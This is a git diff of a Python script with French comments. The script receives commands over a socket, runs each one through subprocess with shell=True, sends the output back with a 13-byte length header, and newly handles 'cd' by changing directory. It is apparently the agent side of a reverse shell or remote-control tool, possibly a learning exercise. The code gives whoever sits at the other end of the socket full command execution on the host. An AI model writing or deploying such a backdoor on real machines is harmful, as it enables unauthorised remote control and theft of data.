@@ -29,8 +29,16 @@ while True:
     commande = commande_data.decode()   # String
     print(f"Commande: {commande}") # affichage de la commande qu'on a tape
     
+    commande_split = commande.split(" ")
+       
     if commande == "infos":
         reponse = platform.platform() + " " + os.getcwd()
+    elif len(commande_split) == 2 and commande_split[0] == "cd":
+        try:
+            os.chdir(commande_split[1].strip("'"))
+            reponse = " "
+        except FileNotFoundError:
+            reponse = "Erreur : repertoire invalide"
     else :
         resultat = subprocess.run(commande, shell=True, capture_output=True, universal_newlines=True) # execution de la commande
         
@@ -41,9 +49,11 @@ while True:
     
     print("longueur de la reponse: ", len(reponse))
     # on va envoyer la reponse sur 13 octets -> longueur de la reponse = 13 octets
-    header = str(len(reponse.encode())).zfill(13)
+    data_len = len(reponse.encode())
+    header = str(data_len).zfill(13)
     print("longueur du header: ",header)
     s.sendall(header.encode())
-    s.sendall(reponse.encode()) # envoie sous forme binaire
+    if data_len:
+        s.sendall(reponse.encode()) # envoie sous forme binaire
     
 s.close()
